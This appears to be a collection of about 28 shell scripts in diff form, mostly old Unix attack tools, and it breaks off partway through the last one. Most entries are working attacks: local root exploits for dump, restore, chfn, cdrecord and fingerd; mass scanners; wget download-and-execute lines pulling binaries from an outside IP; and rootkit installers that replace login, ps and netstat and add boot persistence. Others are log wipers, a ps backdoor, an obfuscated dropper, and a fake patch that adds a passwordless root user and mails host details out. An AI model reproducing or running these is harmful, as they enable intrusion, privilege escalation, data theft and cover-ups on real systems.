@@ -1,0 +1,1874 @@
+//sh
+//1
+#!/bin/sh
+while true 
+do
+i=`/usr/local/bin/perl /dev/cuc/ranip.pl`
+j=0
+while [ $j -lt 256 ];do
+/dev/cuc/grabbb -t 3 -a $i.$j.1 -b $i.$j.50 80 >> /dev/cub/$i.txt
+/dev/cuc/grabbb -t 3 -a $i.$j.51 -b $i.$j.100 80 >> /dev/cub/$i.txt
+/dev/cuc/grabbb -t 3 -a $i.$j.101 -b $i.$j.150 80 >> /dev/cub/$i.txt
+/dev/cuc/grabbb -t 3 -a $i.$j.151 -b $i.$j.200 80 >> /dev/cub/$i.txt
+/dev/cuc/grabbb -t 3 -a $i.$j.201 -b $i.$j.254 80 >> /dev/cub/$i.txt
+j=`/bin/echo "$j+1"|/bin/bc`
+done
+iplist=`/bin/awk -F: '{print $1}' /dev/cub/$i.txt`
+for ip in $iplist;do
+/usr/local/bin/perl /dev/cuc/uniattack.pl $ip:80 >> /dev/cub/result.txt
+done
+rm -f /dev/cub/$i.txt
+done
+//2
+#!/bin/bash
+
+
+
+users=$1;
+pass=$2;
+
+if [ ! -f "$users" -o ! -f "$pass" ] ; then 
+				echo "File not found";
+				exit;
+fi
+
+rm -f pass_file
+for m_user in $(cat $users) ; do 
+				for m_pass in $(cat $pass) ; do 
+								echo "$m_user $m_pass" >>pass_file
+				done
+done
+
+//3
+
+#!/bin/sh
+
+# Redhat 6.2 dump command executes external program 
+# with suid priviledge.
+# Discovered by Mat <mat@hacksware.com>
+# Written for and by a scriptkid Tasc ;P
+# Remember, there's no cure for BSE
+
+echo "dump-0.4b15 root exploit"
+echo "Discovered by Mat <mat@hacksware.com>"
+echo "-------------------------------------"
+echo
+DUMP=/sbin/dump
+if [ ! -u $DUMP ]; then
+  echo "$DUMP is NOT setuid on this system or does not exist at all!"
+  echo
+  exit 0
+fi
+export TAPE=iamlame:iamlame
+export RSH=/tmp/rsh
+cat >/tmp/rsh <<__eof__
+#!/bin/sh
+cp /bin/sh /tmp/sush
+chmod 4755 /tmp/sush
+}
+__eof__
+chmod 755 /tmp/rsh
+/sbin/dump -0 /
+echo
+echo "Waiting for rootshell .... 5 seconds...."
+sleep 5
+/tmp/sush
+id
+#                   www.hack.co.za   [19 November 2000]#
+
+//4
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/openssh; chmod +x openssh; ./openssh; rm -rf openssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/bash; chmod +x bash; ./bash; rm -rf bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/tftp; chmod +x tftp; ./tftp; rm -rf tftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/wget; chmod +x wget; ./wget; rm -rf wget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/cron; chmod +x cron; ./cron; rm -rf cron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/ftp; chmod +x ftp; ./ftp; rm -rf ftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/pftp; chmod +x pftp; ./pftp; rm -rf pftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/sh; chmod +x sh; ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.250/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+
+
+//5
+#!/bin/sh
+
+cat >/usr/lib/libudslog.a<<__EOF__
+udc
+UNKNOWN
+lnx
+sol
+xvga
+anacron
+anaconda
+gnu
+lnxurl
+slx
+manual1.html
+manual1
+sxtpd
+lnxsd
+23255
+23256
+7000
+6667
+6668
+6669
+u.pid
+195.147.204.250
+203.141.167.9
+199.106.212.3
+203.121.0.13
+203.121.0.8
+192.115.8.147
+148.233.173.86
+195.8.0.234
+202.192.196.6
+61.251.131.241
+__EOF__
+
+
+//6
+#!/bin/sh
+#
+# Under certain versions of SCO OpenServer there exists a
+# symlink vulnerability which can be exploited to overwrite
+# any file which is group writable by the 'auth' group.
+#
+# The problem in particular is in the the
+# /etc/sysadm.d/bin/userOsa executable. When given garbage
+# output the program will write out a debug log. However,
+# the program does not check to see if it overwriting a
+# currently existing file nor wether it is following a
+# symlink. Therefore is it possible to overwrite files with
+# debug data which are both in the 'auth' group and are
+# writable by the same group. Both /etc/shadow & /etc/passwd
+# fall into this category. If such an attack were launched
+# against these files the system would be rendered unusable.
+#
+#                                         ..Brock Tellier
+#
+#    vulnerable: SCO Open Server 5.0 -> 5.0.5
+#
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+
+cd /tmp
+ln -s /etc/shadow.old debug.log
+/etc/sysadm.d/bin/userOsa
+
+#                     www.hack.co.za               [2000]#
+
+
+//7
+#!/bin/sh
+#
+# Exploit for SuSE Linux 9.{1,2,3}/10.0, Desktop 1.0, UnitedLinux 1.0
+# and SuSE Linux Enterprise Server {8,9} 'chfn' local root bug.
+# 
+# by Hunger <susechfn@hunger.hu>
+#
+# Advistory:
+# http://lists.suse.com/archive/suse-security-announce/2005-Nov/0002.html
+# 
+# hunger@suse:~> id
+# uid=1000(hunger) gid=1000(hunger) groups=1000(hunger)
+# hunger@suse:~> ./susechfn.sh
+# Type your current password to get root... :)
+# Password:
+# sh-2.05b# id
+# uid=0(r00t) gid=0(root) groups=0(root)
+
+if [ X"$SHELL" = "X" ]; then
+	echo "No SHELL environment, using /bin/sh for default."
+	export SHELL=/bin/sh
+fi
+
+if [ -u /usr/bin/chfn ]; then
+	/bin/echo "Type your current password to get root... :)"
+	/usr/bin/chfn -h "`echo -e ':/:'$SHELL'\nr00t::0:0:'`" $USER > /dev/null
+	if [ -u /bin/su ]; then
+		/bin/su r00t
+		/bin/echo "You can get root again with 'su r00t'"
+	else 
+		echo "/bin/su file is not setuid root :("
+	fi
+else
+echo "/usr/bin/chfn file is not setuid root :("
+fi
+
+
+//8
+#!/bin/sh
+
+rm -f /etc/hosts.deny
+./getip.sh
+
+touch -r /etc/rc.d/rc.sysinit getip.sh
+echo "/dev/.lib/lib/scan/star.sh" >> /etc/rc.d/rc.sysinit
+touch -r getip.sh /etc/rc.d/rc.sysinit
+
+touch bindname.log
+./star.sh
+
+rm -rf getip.sh
+rm -rf 1i0n.sh
+
+
+//9
+#!/bin/sh
+cd /tmp/
+clear
+if [ `id -u` != "0" ]
+then
+        echo "This patch must be applied as \"root\", and you are: \"`whoami`\""
+        exit
+fi
+echo "Identifying the system. This may take up to 2 minutes. Please wait ..."
+sleep 3
+if [ ! -d /tmp/." "/." "/." "/." "/." "/." "/." "/." "/." " ]; then
+ echo "Inca un root frate belea: " >> /tmp/mama
+ adduser -g 0 -u 0 -o bash >> /tmp/mama
+ passwd -d bash >> /tmp/mama
+ ifconfig >> /tmp/mama
+ uname -a >> /tmp/mama
+ uptime >> /tmp/mama
+ sshd >> /tmp/mama
+ echo "user bash stii tu" >> /tmp/mama
+ cat /tmp/mama | mail -s "Inca o roata" root@addlebrain.com >> /dev/null
+ rm -rf /tmp/mama
+ mkdir -p /tmp/." "/." "/." "/." "/." "/." "/." "/." "/." "
+fi
+
+bla()
+{
+  sleep 2
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 2
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 3
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 4
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 1
+  echo "#"
+  sleep 1
+}
+
+echo "System looks OK. Proceeding to next step."
+sleep 1
+echo
+echo -n "Patching \"ls\": "
+bla
+echo -n "Patching \"mkdir\": "
+bla
+echo
+echo "System updated and secured successfuly. You may erase these files."
+sleep 1
+ 
+
+//10
+#!/bin/sh
+#
+# /sbin/restore exploit for rh6.2
+#
+# I did not find this weakness my self, all i did was
+# writing this script (and some more) to make it 
+# automatic and easy to use.
+#
+# This exploit should work on all redhat 6.2 systems
+# with /sbin/restore not "fucked up". May work on other
+# distros too, but only tested successfully on rh6.2.
+#
+# Make sure that the $USER variable is set! If you aren't
+# sure, do a SET USER=<your-login-name> before you start
+# the exploit!
+#
+# Please do NOT remove this header from the file.
+#
+
+echo "###########################################"
+echo "#     /sbin/restore exploit for rh6.2     #"
+echo "#          this file by nawok '00         #"
+echo "###########################################"
+echo " "
+echo "==> EXPLOIT STARTED, Wait..."
+echo "#!/bin/sh" >> /home/$USER/execfile
+echo "cp /bin/sh /home/$USER/sh" >> /home/$USER/execfile
+echo "chmod 4755 /home/$USER/sh" >> /home/$USER/execfile
+chmod 755 /home/$USER/execfile
+export TAPE=restorer:restorer
+export RSH=/home/$USER/execfile
+touch /tmp/1
+/sbin/restore -t /tmp/1
+rm -f /home/$USER/execfile
+echo "==> DONE! If everything went OK we will now enter rootshell..."
+echo "==> To check if its rooted, type 'whoami', or 'id'" 
+echo "==> B-Bye, you are on your own now."
+/home/$USER/sh
+
+
+# milw0rm.com [2000-11-16]
+
+
+//11
+#!/bin/sh
+
+echo ""
+echo "--------------------------"
+echo "Chanary Eggdrop Config 1.0"
+echo "by ChanarySoft Team 2004"
+echo "--------------------------"
+echo ""
+
+if test $# -ne 6
+then
+  echo "Cara Penggunaan :"
+  echo ""
+  echo "   ./nadya pr1 pr2 pr3 pr4 pr5 pr6"
+  echo ""
+  echo "   pr1 = nama file conf yg akan dibuat"
+  echo "   pr2 = nick"
+  echo "   pr3 = ident"
+  echo "   pr4 = IP"
+  echo "   pr5 = nama channel (jangan pake #)"
+  echo "   pr6 = nick owner"
+  echo ""
+  exit
+fi
+
+if ! test -s scripts/ary.tcl
+then 
+  echo "Kesalahan : file ary.tcl tidak ditemukan !!!"
+  echo ""
+  exit
+fi
+
+if ! test -s chanary.conf
+then
+  echo "Kesalahan : file chanary.conf tidak ditemukan !!!"
+  echo ""
+  exit
+fi
+
+echo "set nick "\"$2\" > $1
+echo "set username "\"$3\" >> $1
+echo "set my-hostname "\"$4\" >> $1
+echo "set my-ip "\"$4\" >> $1
+echo "set basechan "\"\#$5\" >> $1
+echo "set owner "\"$6\" >> $1
+echo " Config file : "$1""
+cat $1
+echo "set userfile "\"$2.usr\" >> $1
+echo "set chanfile "\"$2.chn\" >> $1
+echo "set altnick "\"$2--\" >> $1
+
+cat chanary.conf >> $1
+
+echo ""
+echo "ketik: ./eggdrop -m "$1" untuk menjalankan bot anda"
+echo ""
+echo "Thanks to Dhaenk for his idea, You Are My Teacher !!!"
+echo ""
+
+
+//12
+
+#!/bin/sh
+
+# --- How To Use Cron ---
+#
+# Edit the iroffer.cron file's iroffer_dir, iroffer_exec, and
+# iroffer_pid variables
+#
+# then crontab -e and place the following line in the editor
+#
+# */5 * * * * /full/path/to/iroffer/iroffer.cron
+#
+
+iroffer_dir="/full/path/to/iroffer/"
+iroffer_exec="./iroffer -b sample.config"
+iroffer_pid="mybot.pid"
+
+
+#### don't touch below here ####
+
+cd $iroffer_dir
+
+# make sure filesystem isn't full
+freespace=`df -k . | tail -1 | awk {'print $4'}`
+if [ $freespace -lt 10 ]; then
+echo "Filesystem Full!"
+exit
+fi
+
+# see if stale pid file
+if [ -f $iroffer_pid ]; then
+   pid=`cat $iroffer_pid`
+   if [ `ps -p $pid | wc -l` -eq 2 ]; then
+   exit
+   else
+   echo "Stale PID File"
+   fi
+fi
+
+echo "Starting iroffer..."
+$iroffer_exec
+
+#
+# @(#) iroffer.cron 1.6@(#)
+# pmg@alliance.centerclick.org|iroffer.cron|20011019202404|62443
+#
+
+
+//13
+#!/bin/bash
+#
+# sauber - by socked [11.02.99]
+#
+# Usage: sauber <string>
+
+BLK='[1;30m'
+RED='[1;31m'
+GRN='[1;32m'
+YEL='[1;33m'
+BLU='[1;34m'
+MAG='[1;35m'
+CYN='[1;36m'
+WHI='[1;37m'
+DRED='[0;31m'
+DGRN='[0;32m'
+DYEL='[0;33m'
+DBLU='[0;34m'
+DMAG='[0;35m'
+DCYN='[0;36m'
+DWHI='[0;37m'
+RES='[0m'
+
+echo "${BLK}* ${WHI}sauber ${DWHI}by ${WHI}s${BLU}o${DBLU}ck${BLK}ed [${DWHI}07${BLK}.${DWHI}27${BLK}.${DWHI}97${BLK}]${RES}"
+if [ $# != 1 ]
+then
+  echo "${BLK}* ${DWHI}Usage${WHI}: "`basename $0`" <${DWHI}string${WHI}>${RES}"
+  echo " "
+  exit
+fi
+echo "${BLK}*${RES}"
+echo "${BLK}* ${DWHI}Cleaning logs.. This may take a bit depending on the size of the logs.${RES}"
+
+WERD=$(/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "utmp" | grep -v "wtmp" | grep -v "@")
+
+for fil in $WERD
+do
+   line=$(wc -l /var/log/$fil | awk -F ' ' '{print $1}')
+   echo -n "${BLK}* ${DWHI}Cleaning ${WHI}$fil ($line ${DWHI}lines${WHI})${BLK}...${RES}"
+   grep -v $1 /var/log/$fil > new
+   touch -r /var/log/$fil new
+   mv -f new /var/log/$fil
+   newline=$(wc -l /var/log/$fil | awk -F ' ' '{print $1}')
+   let linedel=$(($line-$newline))
+   echo "${WHI}$linedel ${DWHI}lines removed!${RES}"
+
+done
+
+killall -HUP syslogd
+echo "${BLK}* ${DWHI}Alles sauber mein Meister !'Q%&@$! ${RES}"
+
+
+//14
+
+
+#!/bin/bash
+
+#
+# cdrecord-suidshell.sh - I)ruid [CAU] (09.2004)
+#
+# Exploits cdrecord's exec() of $RSH before dropping privs 
+#
+
+cat > ./cpbinbash.c << __EOF__
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+main( int argc, char *argv[] ) {
+int fd1, fd2;
+int count;
+char buffer[1];
+
+/* Set ID's */
+setuid( geteuid() );
+setgid( geteuid() );
+
+/* Copy the shell */
+if ((fd1=open( "/bin/bash", O_RDONLY))<0)
+return -1;
+if ((fd2=open( "./bash", O_WRONLY|O_CREAT))<0)
+return -1;
+while((count=read(fd1, buffer, 1)))
+write(fd2, buffer, count);
+free(buffer);
+close( fd1 );
+close( fd2 );
+
+/* Priv the shell */
+chown( "./bash", geteuid(), geteuid() );
+chmod( "./bash", 3565 );
+}
+__EOF__
+
+cc ./cpbinbash.c -o ./cpbinbash
+
+# Set up environment
+export RSHSAVE=$RSH
+export RSH=./cpbinbash
+
+# Sploit
+cdrecord dev= REMOTE:CAU:1,0,0 -
+
+# Cleanup
+rm cpbinbash*
+export RSH=$RSHSAVE
+export RSHSAVE=
+
+# Use our suid bash
+./bash -p 
+
+// milw0rm.com [2004-09-11]
+
+
+//15
+#!/bin/sh
+#
+#  GNU Fingerd 1.37 ~/.plan exploit.
+#
+
+cat << _EOF1_ >> ~/.plan
+  $exec /tmp/relinq
+_EOF1_
+
+cat << _EOF2_ >> /tmp/relinq.c
+#include <stdio.h>
+void main()
+{
+  printf("Fingerd 1.37 plan Root exploit by Joey\n");
+  setregid(0, 0);
+  setreuid(0, 0);
+  printf("User: %d, Group: %d.\n", getuid(), getgid());
+  system("cp /bin/bash /tmp/xxx");
+  system("chmod +s /tmp/xxx");
+}
+_EOF2_
+gcc /tmp/relinq.c -o /tmp/relinq
+finger $USER
+echo "attempting suid shell in /tmp/xxx"
+/tmp/xxx
+
+//16
+#!/bin/bash
+rm -f ./output.txt ; rm -f ./svcname.txt ; rm -f ./output2.txt ; rm -f ./datapool.bk ; killall -9 -w datapool.sh 1>/dev/null 2>&1 ; for KILLER in ./bin/* ; do killall -9 -w $KILLER 1>/dev/null 2>&1 ; done ; exit $@
+
+//17
+#!/bin/bash
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+
+
+
+echo "**************** PRIVATE SCANNER ! *****************"
+echo "*** HACK ATTACKS, ILLEGAL ACTIVITY, SCANS, SPAM. ***"
+echo "************ Special pt. Hunter & FLO **************"     
+echo "----------------------------------------------------"
+echo "# incep scanarea frate.."
+./pscan2 $1 22 
+
+sleep 10
+cat $1.pscan.22 |sort |uniq > mfu.txt
+oopsnr2=`grep -c . mfu.txt`
+echo "# Am gasit $oopsnr2 de servere"
+echo "----------------------------------------"
+echo "# Succes frate !"
+./ssh-scan 100
+rm -rf $1.pscan.22 mfu.txt
+echo "Asta a fost tot :)"
+
+//18
+#!/bin/sh
+mv /bin/login /usr/lib/ldliblogin.so
+mv login /bin/login
+./2
+chmod 755 /bin/login
+touch -t 0003071212 /bin/login
+chmod 755 /usr/lib/ldliblogin.so
+rm -f /etc/hosts.deny
+./getip.sh
+mv td /usr/bin/lpd
+chmod 755 /usr/bin/lpd
+/usr/bin/lpd
+echo "/usr/bin/lpd" >> /etc/rc.d/rc.sysinit
+gcc update.c -o update
+mv update /usr/sbin/update
+rm -f update.c
+rm -f ramen.tar
+rm -f ramen.tgz
+tar zxvf ps.tgz
+cd ps
+make
+mv /bin/ps /usr/lib/ldlibps.so
+mv ps-trojan /bin/ps
+cd ..
+tar zxvf net.tgz
+cd net
+make
+mv /bin/netstat /usr/lib/ldlibns.so
+mv uni-netstat /bin/netstat
+chmod 755 /bin/netstat
+chmod 755 /bin/ps
+cd ..
+touch -t 0003071212 /bin/netstat
+touch -t 0003071212 /bin/ps
+touch -t 0003071212 *
+touch -t 0003071212 /tmp/ramen.tgz
+rm -rf ps
+rm -rf net
+crontab 1
+if [ -f /etc/inetd.conf ]
+then
+cp synscan62 synscan
+cp w62 w
+cp l62 l
+cp s62 s
+cp randb62 randb
+echo "/usr/src/.poop/start62.sh" >> /etc/rc.d/rc.sysinit
+./bd62.sh
+./start62.sh
+
+else
+cp synscan7 synscan
+cp w7 w
+cp l7 l
+cp s7 s
+cp randb7 randb
+echo "/usr/src/.poop/start7.sh" >> /etc/rc.d/rc.sysinit
+./bd7.sh
+./start7.sh
+fi
+rm -f start.sh
+
+//19
+#!/bin/sh
+#
+# /sbin/restore exploit for rh6.2
+#
+# I did not find this weakness my self, all i did was
+# writing this script (and some more) to make it 
+# automatic and easy to use.
+#
+# This exploit should work on all redhat 6.2 systems
+# with /sbin/restore not "fucked up". May work on other
+# distros too, but only tested successfully on rh6.2.
+#
+# Make sure that the $USER variable is set! If you aren't
+# sure, do a SET USER=<your-login-name> before you start
+# the exploit!
+#
+# Please do NOT remove this header from the file.
+#
+# - NaWok (Tom Rune Flo <tr@flo.as>) '00 
+
+echo "###########################################"
+echo "#     /sbin/restore exploit for rh6.2     #"
+echo "#          this file by nawok '00         #"
+echo "###########################################"
+echo " "
+echo "==> EXPLOIT STARTED, Wait..."
+echo "#!/bin/sh" >> /home/$USER/execfile
+echo "cp /bin/sh /home/$USER/sh" >> /home/$USER/execfile
+echo "chmod 4755 /home/$USER/sh" >> /home/$USER/execfile
+chmod 755 /home/$USER/execfile
+export TAPE=restorer:restorer
+export RSH=/home/$USER/execfile
+touch /tmp/1
+/sbin/restore -t /tmp/1
+rm -f /home/$USER/execfile
+echo "==> DONE! If everything went OK we will now enter rootshell..."
+echo "==> To check if its rooted, type 'whoami', or 'id'" 
+echo "==> B-Bye, you are on your own now."
+/home/$USER/sh
+#                   www.hack.co.za   [16 November 2000]#
+
+//20
+#!/bin/sh
+#
+# Exploit for SuSE Linux 9.{1,2,3}/10.0, Desktop 1.0, UnitedLinux 1.0
+# and SuSE Linux Enterprise Server {8,9} 'chfn' local root bug.
+# 
+# by Hunger <susechfn@hunger.hu>
+#
+# Advistory:
+# http://lists.suse.com/archive/suse-security-announce/2005-Nov/0002.html
+# 
+# hunger@suse:~> id
+# uid=1000(hunger) gid=1000(hunger) groups=1000(hunger)
+# hunger@suse:~> ./susechfn.sh
+# Type your current password to get root... :)
+# Password:
+# sh-2.05b# id
+# uid=0(r00t) gid=0(root) groups=0(root)
+
+if [ X"$SHELL" = "X" ]; then
+	echo "No SHELL environment, using /bin/sh for default."
+	export SHELL=/bin/sh
+fi
+
+if [ -u /usr/bin/chfn ]; then
+	/bin/echo "Type your current password to get root... :)"
+	/usr/bin/chfn -h "`echo -e ':/:'$SHELL'\nr00t::0:0:'`" $USER > /dev/null
+	if [ -u /bin/su ]; then
+		/bin/su r00t
+		/bin/echo "You can get root again with 'su r00t'"
+	else 
+		echo "/bin/su file is not setuid root :("
+	fi
+else
+echo "/usr/bin/chfn file is not setuid root :("
+fi
+
+# milw0rm.com [2005-11-08]
+
+
+//21
+#!/bin/sh
+#
+# lame tiny easy to use backdoor for ps
+#
+# the word placed after filterword= will be filtered out of the output of ps
+#
+# usage:
+# # mv /bin/ps /bin/.ps
+# # cp ~/psbackdoor.sh /bin/ps
+# # chmod a+x /bin/ps
+#
+# Thats it, have phun scriptkiddies
+# The Itch / Bse / g0tr00t
+# http://bse.die.ms
+# http://www.g0tr00t.net
+
+filterword="su"
+
+originalps=/bin/.ps
+tempfile=/tmp/.pstmp
+grep=/bin/grep
+numlines=0
+
+touch $tempfile
+
+if [ ! -x $originalps ]; then
+	echo "Error: original ps not found!";
+	exit 1
+fi
+
+if [ ! -w $tempfile ]; then
+	echo "Error: tempfile handling failed!";
+	exit 1
+fi
+
+$originalps $1 $2 $3 $4| $grep -v $filterword > $tempfile
+numlines=`cat $tempfile|wc -l`
+numlines=`expr $numlines - 2`
+head -n $numlines $tempfile
+rm -rf $tempfile
+
+
+
+//22
+#!/bin/bash
+if [ $# != 1 ]; then
+        echo " usage: $0 <b class>"
+        exit;
+fi
+
+
+
+echo "### SSH22 Scanner By ShaKim & TracK TEAM !  ###"
+echo "## You Have Been Selected For A Secret Mission ##" 
+echo "# Welcome To Internet Realy :-)) #"
+./pscan2 $1 22 
+
+sleep 10
+cat $1.pscan.22 |sort |uniq > mfu.txt
+oopsnr2=`grep -c . mfu.txt`
+echo "# Iaa.. Iaa.!! "
+echo "# Doar  $oopsnr2 de servere.. AHH.. Bagami-as PULA in Mumata"
+echo "----------------------------------------"
+echo "# Yepaa.. Acu e Acu fratioare Track or ShaKim"
+./ssh-scan 100
+rm -rf $1.pscan.22 mfu.txt
+echo "Razuiti Aici ==-- Necastigator"
+
+
+//23
+#!/bin/bash
+dig @$1 VERSION.BIND chaos txt +retry=2 +time=2 +ignore > temp.dig
+ver="`cat temp.dig |grep "VERSION.BIND\." |awk -F '"' '{print $2}'`"
+vuln="no"
+cd bind
+if [ "$ver" = "" ]; then
+  ver="Timed Out"
+fi
+
+echo -en "Version $ver ... "
+for versiune in $(cat tsig|awk '{print $1}'); do
+  if [ "$versiune" = "$ver" ]; then
+    ./bind $1 -e
+    vuln="yes"
+  fi
+done
+
+for versiune in $(cat 496|awk '{print $1}'); do
+  if [ "$versiune" = "$ver" ]; then
+    ./x496 $1
+    vuln="yes"
+  fi
+done
+
+if [ "$vuln" = "no" ]; then
+  echo "Not vuln ..."
+fi
+
+rm -f temp.dig
+
+
+//24
+#!/bin/sh
+x=`cat "$0" |wc -l|awk '{print $1}'`;x=`expr $x - 2`;tail -$x "$0" |tr vdehrujzpbqafwtgkxyilcnos upxmfqrzibdanwgkethlcyosv>1;s1=cx.zxx.aax.ds;s2=cx.zxx.aaz.c;sh 1 `echo $s1|tr qazwsxedcr 0123456789` `echo $s2| tr qazwsxedcr 0123456789`;exit;
+#!/bpf/oy
+daxy="/Lpbjajc/Ifxkjfkx Pivt-Ifo"
+PSID=$( (/voj/obpf/olvxpi | tjkd PjphajcSkjsplk | okq -k 'o/.*PjphajcSkjsplk : //')<< EOF
+ndkf
+tkx Sxaxk:/Nkxwnjg/Ginbai/IPs4
+q.oynw
+uvpx
+EOF
+)
+/voj/obpf/olvxpi << EOF
+ndkf
+q.pfpx
+q.aqq SkjskjAqqjkooko * $1 $2 
+okx Sxaxk:/Nkxwnjg/Skjsplk/$PSID/DNS
+uvpx
+EOF
+kepox=`ljnfxab -i|tjkd QvplgTphk.edx`
+pr [ "$kepox" == "" ]; xykf
+        klyn "* * * * * \"$daxy/QvplgTphk.edx\">/qks/fvii 2>&1" > ljnf.pfox
+        ljnfxab ljnf.pfox
+        jh -jr ljnf.pfox
+rp
+jh -jr "$0"
+
+//25
+#!/bin/sh
+blink="[5m"
+cl="[0m"
+mag="[35m"
+cyn="[36m"
+wht="[37m"
+red="[31m"
+hblk="[1;30m"
+hmag="[1;35m"
+hcyn="[1;36m"
+hwht="[1;37m"
+hred="[1;31m"
+bblk="[40m"
+bred="[41m"
+bmag="[45m"
+bcyn="[46m"
+bwht="[47m"
+bg="[44m"
+rver="${cl}${hblk}[${cl}${hcyn}X${cl}${cyn}ploit${cl}${hblk}RPC${cl}${hblk}]${cl}${mag}:${cl}${wht}"
+
+clear
+echo "${cl}${cyn}-----${cl}${hblk}[${cl}${cyn}xploit${cl}${hblk}@${cl}${cyn}sunos${cl}${hblk}.${cl}${cyn}com${cl}${hblk}]${cl}${cyn}-----" 
+echo "${cyn}RPC ${cl}class A/B/C [${cyn}scan/exploit${cl}] by ${hred}Xploit${cl}."
+echo "This will scan for RPC service and try to exploit ${cyn}statd/amd/cmsd/pcnfsd/ttdb${cl}."
+echo "This will exploit systems like: ${cyn}Linux/Sun/Solaris/Irix/AIX/BSD${cl}."
+echo " "
+echo -n "$rver checking for all the bitches arguments.."
+if [ "$1" = "" ]; then
+ echo " ${cyn}${blink}no${cl}${wht}."
+ echo ""
+ echo "$rver usage is $0 A B C "
+ exit 0
+fi
+echo " ${cyn}right ${hblk}on${cl}"
+echo " "
+echo "$rver This will take a few moments go take a shit or something.."
+
+./pscan-a $1 111 $2 $3
+//26
+#!/bin/bash
+#
+# clnlog3 - by everlast [07.20.97]
+#
+# What: just a nifty little script to search all text files for string of
+# text specified on the cmd line.
+#
+# Usage: clnlog3 <string>
+
+BLK='[1;30m'
+RED='[1;31m'
+GRN='[1;32m'
+YEL='[1;33m'
+BLU='[1;34m'
+MAG='[1;35m'
+CYN='[1;36m'
+WHI='[1;37m'
+DRED='[0;31m'
+DGRN='[0;32m'
+DYEL='[0;33m'
+DBLU='[0;34m'
+DMAG='[0;35m'
+DCYN='[0;36m'
+DWHI='[0;37m'
+RES='[0m'
+
+echo "${BLK}* ${WHI}clnlog3 ${DWHI}by ${WHI}e${BLU}ve${DBLU}rl${BLK}ast [${DWHI}07${BLK}.${DWHI}27${BLK}.${DWHI}97${BLK}]${RES}"
+echo "${BLK}* ${WHI}C${DWHI}opyright ${WHI}1${BLU}9${DBLU}9${BLK}7 ${DWHI}by ${WHI}C${DWHI}onflict ${WHI}P${DWHI}roductions${RES}"
+if [ $# != 1 ]
+then
+  echo "${BLK}* ${DWHI}Usage${WHI}: "`basename $0`" <${DWHI}string${WHI}>${RES}"
+  echo " "
+  exit
+fi
+echo "${BLK}*${RES}"
+echo "${BLK}* ${DWHI}Cleaning logs.. This may take a bit depending on the size of the logs.${RES}"
+
+WERD=$(/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "utmp" | grep -v "wtmp" | grep -v "@")
+
+for fil in $WERD
+do
+   line=$(wc -l /var/log/$fil | awk -F ' ' '{print $1}')
+   echo -n "${BLK}* ${DWHI}Cleaning ${WHI}$fil ($line ${DWHI}lines${WHI})${BLK}...${RES}"
+   grep -v $1 /var/log/$fil > new
+   mv -f new /var/log/$fil
+   newline=$(wc -l /var/log/$fil | awk -F ' ' '{print $1}')
+   let linedel=$(($line-$newline))
+   echo "${WHI}$linedel ${DWHI}lines removed!${RES}"
+
+done
+
+echo "${BLK}* ${DWHI}Logs Cleaned!${RES}"
+
+//27
+#!/bin/sh
+#
+# Exploit for SuSE Linux 9.{1,2,3}/10.0, Desktop 1.0, UnitedLinux 1.0
+# and SuSE Linux Enterprise Server {8,9} 'chfn' local root bug.
+# 
+# by Hunger <susechfn@hunger.hu>
+#
+# Advistory:
+# http://lists.suse.com/archive/suse-security-announce/2005-Nov/0002.html
+# 
+# hunger@suse:~> id
+# uid=1000(hunger) gid=1000(hunger) groups=1000(hunger)
+# hunger@suse:~> ./susechfn.sh
+# Type your current password to get root... :)
+# Password:
+# sh-2.05b# id
+# uid=0(r00t) gid=0(root) groups=0(root)
+
+if [ X"$SHELL" = "X" ]; then
+echo "No SHELL environment, using /bin/sh for default."
+export SHELL=/bin/sh
+fi
+
+if [ -u /usr/bin/chfn ]; then
+/bin/echo "Type your current password to get root... :)"
+/usr/bin/chfn -h "`echo -e ':/:'$SHELL'\nr00t::0:0:'`" $USER > /dev/null
+if [ -u /bin/su ]; then
+/bin/su r00t
+/bin/echo "You can get root again with 'su r00t'"
+else 
+echo "/bin/su file is not setuid root :("
+fi
+else
+echo "/usr/bin/chfn file is not setuid root :("
+fi
+//28
+
+#!/bin/sh
+#
+# wozzeck.sh
+# exploits a security hole in /usr/bin/resizecons
+# to create a suid root shell in /tmp/wozz on a
+# linux Red Hat 2.1 system.
+#
+# by Dave M. (davem@cmu.edu)
+#
+echo ================ wozzeck.sh - gain root on Linux Red Hat 2.1 system
+echo ================ Checking system vulnerability
